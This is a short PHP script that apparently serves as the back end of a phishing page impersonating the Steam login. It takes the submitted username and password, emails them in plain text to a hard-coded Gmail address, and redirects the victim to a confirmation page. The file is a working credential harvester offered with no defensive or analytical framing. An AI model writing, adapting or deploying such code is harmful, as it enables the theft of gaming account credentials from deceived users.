<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['username'];
    $contraseña = $_POST['password'];

    $destinatario = "benja778yt@gmail.com";
    $asunto = "Inicio de sesión en Steam";
    $mensaje = "Se ha intentado iniciar sesión en Steam con los siguientes datos:\n\n";
    $mensaje .= "Usuario: " . $usuario . "\n";
    $mensaje .= "Contraseña: " . $contraseña . "\n";

    // Enviar correo
    mail($destinatario, $asunto, $mensaje);

    // Redireccionar a una página de confirmación
    header("Location: confirmacion.html");
    exit();
}
?>